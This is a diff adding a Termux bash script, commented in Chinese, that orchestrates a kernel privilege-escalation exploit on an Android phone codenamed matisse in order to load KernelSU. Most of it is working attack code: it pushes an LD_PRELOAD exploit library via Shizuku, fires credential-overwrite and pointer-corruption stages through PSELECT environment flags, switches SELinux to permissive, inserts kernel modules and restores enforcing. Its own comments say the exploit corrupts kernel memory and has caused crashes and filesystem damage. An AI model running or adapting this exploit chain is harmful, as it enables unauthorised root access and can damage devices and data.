@@ -1,0 +1,148 @@
+#!/data/data/com.termux/files/usr/bin/bash
+# ============================================================================
+# ksu_load.sh v2 — matisse 装载 kernelsu (2026-09-09 23:xx)
+#
+# ★ 纪律升级 (依据 WILDPTR_INCIDENT_20260908.md):
+#   exploit 每跑一次就种毒链, 之后每次 futex/优先级传播都会随机涂抹内核内存
+#   (已造成 8 次崩溃 + 设置/输入法重置 + inode 损坏).
+#   => 每 boot 只允许 1 次尝试; R 没中/装失败 就放弃本 boot, 重启后再来.
+#
+# 序列(单次尝试): 体检 -> 推文件 -> R 轮(1次) -> E5v3(permissive) -> C轮装 kernelsu
+#                -> 若失败, 同一窗口内再用 C 轮装 preflight 做"加载器诊断" -> E5R 还原
+# 用法:  bash ~/ksu_load.sh
+# ============================================================================
+set -u
+H="$HOME"
+KODIR="$H/matisse/bin/ksu"
+PRE="$KODIR/preflight_gki209.ko"
+KSU="$KODIR/kernelsu_gki209_v2.ko"
+EXP="$H/matisse/bin/mt85/preload.so"
+OUTD=/data/local/tmp
+TS=$(date +%Y%m%d_%H%M%S)
+LOGD="$H/ksu_load_logs_$TS"
+RISH="$H/rish"
+mkdir -p "$LOGD"
+say(){ echo "[$(date +%H:%M:%S)] $*"; }
+
+echo "=========================================================="
+echo " matisse KSU 装载 (每 boot 只打 1 次, 防毒链累积)"
+echo " 日志: $LOGD"
+echo " 跑之前: 手机刚重启过 / 至少开机 10 分钟 / 亮屏别锁"
+echo "=========================================================="
+for f in "$PRE" "$KSU" "$EXP" "$RISH"; do [ -f "$f" ] || { echo "!! 缺文件: $f"; exit 1; }; done
+
+rsh1(){ (cd "$H" && timeout "${2:-60}" ./rish "$1") 2>&1; }
+rsh(){ local cmd="$1" t="${2:-60}" out i
+  for i in 1 2 3 4 5; do
+    out=$(rsh1 "$cmd" "$t")
+    printf "%s" "$out" | grep -q "Request timeout\|blocked by your system" || { printf "%s\n" "$out"; return 0; }
+    [ "$i" -lt 5 ] && say "Shizuku 闪断 $i/5, 8s 重试 (Shizuku 要显示正在运行 + 电池无限制)" >&2; sleep 8
+  done; printf "%s\n" "$out"; return 1; }
+rpush(){ local l="$1" r="$2" out i
+  for i in 1 2 3 4 5; do
+    out=$( (cd "$H" && timeout 180 ./rish "cat > $r") < "$l" 2>&1 )
+    printf "%s" "$out" | grep -q "Request timeout\|blocked by your system" || { printf "%s\n" "$out"; return 0; }
+    [ "$i" -lt 5 ] && say "推送闪断 $i/5, 8s 重试" >&2; sleep 8
+  done; printf "%s\n" "$out"; return 1; }
+
+# ---------- 体检 (不开火) ----------
+BOOT=$(rsh "cat /proc/sys/kernel/random/boot_id" 20 | tr -d "\r")
+printf "%s" "$BOOT" | grep -qE "^[0-9a-f]{8}-" || { echo "!! rish 不通 (Shizuku 没启动?). 输出: $BOOT"; exit 2; }
+ENF=$(rsh "getenforce" 20 | tr -d "\r")
+UP=$(rsh "awk \"{print int(\$1)}\" /proc/uptime" 20 | tr -d "\r")
+LOAD=$(rsh "cat /proc/loadavg" 20 | tr -d "\r" | cut -d" " -f1)
+RES=$(rsh "pgrep -x sleep | wc -l" 20 | tr -d "\r ")
+HOST=$(rsh "ls -la /proc/sys/kernel/hostname 2>&1 | head -1" 20 | tr -d "\r")
+say "boot=$(printf "%s" "$BOOT" | cut -c1-8) enforce=$ENF uptime=${UP}s load=$LOAD 残留sleep=${RES:-?}"
+say "hostname procfs: $HOST"
+[ "$ENF" = "Enforcing" ] || { echo "!! 当前 $ENF (应为 Enforcing) — 重启手机再跑"; exit 2; }
+case "${UP:-x}" in ""|*[!0-9]*) echo "!! uptime 读不到"; exit 2;; esac
+[ "$UP" -ge 600 ] || { echo "!! 开机才 ${UP}s — 等 10 分钟 (settle) 再跑"; exit 2; }
+L=${LOAD%%.*}; case "$L" in ""|*[!0-9]*) L=99;; esac
+[ "$L" -le 15 ] || { echo "!! load=$LOAD >15 — 等凉下来再跑"; exit 2; }
+[ "${RES:-0}" -le 2 ] || { echo "!! 残留 sleep 进程 ${RES} 个 — 先重启手机"; exit 2; }
+
+# ---------- 推文件 ----------
+say "推送 preload.so + kernelsu + preflight ..."
+rpush "$EXP" "$OUTD/preload.so" >/dev/null
+rpush "$KSU" "$OUTD/kernelsu_gki209.ko" >/dev/null
+rpush "$PRE" "$OUTD/preflight_gki209.ko" >/dev/null
+rsh "chmod 644 $OUTD/preload.so $OUTD/kernelsu_gki209.ko $OUTD/preflight_gki209.ko; sync" 30 >/dev/null
+CHK=$(rsh "sha256sum $OUTD/preload.so $OUTD/kernelsu_gki209.ko $OUTD/preflight_gki209.ko" 30 | tr -d "\r")
+echo "$CHK" | tee "$LOGD/device_sha256.txt"
+echo "$CHK" | grep -q "$(sha256sum "$KSU" | cut -c1-16)" || { echo "!! kernelsu SHA 不符, 重推一次再跑"; exit 3; }
+say "SHA 校验通过"
+
+# ---------- 开火机器 ----------
+fire(){
+  local name="$1" kind="$2" task="${3:-}" ko="${4:-}" cmd tskenv koflag
+  tskenv=""; [ -n "$task" ] && tskenv="PSELECT_TASK=$task"
+  koflag=""; [ -n "$ko" ] && koflag="PSELECT_KO=$ko"
+  case "$kind" in
+    R)   cmd="PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1";;
+    E5)  cmd="PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1";;
+    C)   cmd="PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=C PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 $tskenv $koflag PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1";;
+    E5R) cmd="PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 PSELECT_SELINUX_ENF_VALUE=SPRAY1 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1";;
+  esac
+  say ">>> 开火 $name (约 4-5 分钟, 别动手机)"
+  rsh1 "timeout 250 env $cmd LD_PRELOAD=$OUTD/preload.so /system/bin/sleep 180 > $OUTD/$name.out 2>&1" 280 \
+    | tee "$LOGD/$name.tail" | grep -a "RC=\|ROOT-SEEN\|finit_module\|resolver\|no symbol\|disagree" | tail -3
+  say "$name 完成 enforce=$(rsh "getenforce" 20 | tr -d "\r")"
+}
+gate(){ local st; st=$(rsh "cat $OUTD/mt49_child_status.txt" 30 | tr -d "\r")
+  printf "%s" "$st" | grep -q "CapEff=0000000000000000" && { echo R_MISS; return; }
+  printf "%s" "$st" | grep -q "task=" && { echo R_LANDED; return; }; echo R_MISS; }
+gettask(){ rsh "cat $OUTD/mt49_child_status.txt" 30 | tr -d "\r" | grep -a "^task=" | tail -1 | cut -d= -f2 | cut -d" " -f1; }
+hbfresh(){ local now mt; now=$(rsh "date +%s" 20 | tr -d "\r"); mt=$(rsh "stat -c %Y $OUTD/mt49_child_status.txt" 20 | tr -d "\r")
+  case "$now$mt" in ""|*[!0-9]*) return 1;; esac; [ $((now-mt)) -le 30 ]; }
+
+# ---------- R 轮: 只打 1 次 ----------
+rsh "pkill -9 -x sleep 2>/dev/null; rm -f $OUTD/mt49_child_status.txt $OUTD/root_alive.txt" 20 >/dev/null
+fire R1 R "" ""
+G=$(gate); say "R1: $G"
+if [ "$G" != "R_LANDED" ]; then
+  echo "!! R 没中 (命中率 10-25%). 按新纪律: 本 boot 到此为止."
+  echo "   重启手机 -> 开机 10 分钟后 -> 再跑一次 bash ~/ksu_load.sh"
+  exit 5
+fi
+T=$(gettask); say "R 落地 task=$T"
+
+# ---------- E5v3 permissive ----------
+fire E5a E5 "" ""
+hbfresh || { echo "!! child 心跳陈旧, 不打 C 轮"; fire E5R E5R "" ""; exit 6; }
+say "permissive: enforce=$(rsh "getenforce" 20 | tr -d "\r")"
+
+# ---------- C 轮: 装 kernelsu (本 boot 唯一一发) ----------
+fire Cksu C "$T" "$OUTD/kernelsu_gki209.ko"
+KSUM=$(rsh "grep -c ksu /proc/modules 2>/dev/null" 20 | tr -d "\r ")
+KSDM=$(rsh "dmesg 2>/dev/null | grep -ci \"ksu\"" 20 | tr -d "\r ")
+rsh "dmesg 2>/dev/null | grep -aiE \"ksu|kernelsu\" | tail -15" 30 | tee "$LOGD/dmesg_ksu.txt"
+say "kernelsu: /proc/modules=${KSUM:-0}  dmesg(ksu)=${KSDM:-0}"
+
+# ---------- 失败才做 preflight 诊断 (同一窗口) ----------
+if [ "${KSUM:-0}" -lt 1 ]; then
+  say "KSU 没装上 -> 同一窗口内装 preflight 做加载器诊断 (零风险)"
+  fire Cpre C "$T" "$OUTD/preflight_gki209.ko"
+  PREMOD=$(rsh "grep -c ^preflight /proc/modules 2>/dev/null" 20 | tr -d "\r ")
+  rsh "dmesg 2>/dev/null | grep -ai matisse-preflight | tail -5" 30 | tee "$LOGD/dmesg_preflight.txt"
+  say "preflight: /proc/modules=${PREMOD:-0}"
+  if [ "${PREMOD:-0}" -ge 1 ]; then
+    say "=> 加载器/vermagic/CRC/CFI 全部 OK, 问题在 KSU 自身初始化 (看 dmesg_ksu.txt)"
+  else
+    say "=> 连无害模块都装不上 => 加载器层面问题 (看 dmesg_preflight.txt)"
+  fi
+fi
+
+# ---------- 还原 enforcing ----------
+say "还原 enforcing ..."
+fire E5R E5R "" ""
+FIN=$(rsh "getenforce" 20 | tr -d "\r")
+
+echo
+echo "==================== 总结 ===================="
+echo " R: $G   task=$T"
+echo " kernelsu in /proc/modules: ${KSUM:-0}"
+if [ "${KSUM:-0}" -ge 1 ]; then echo " ★★★ KSU 已加载 — 打开 KernelSU 管理器看是否转绿 ★★★"; fi
+echo " 最终 SELinux: $FIN   (若为 Permissive: 重启一次即恢复 Enforcing)"
+echo " 日志: $LOGD"
+echo "=============================================="
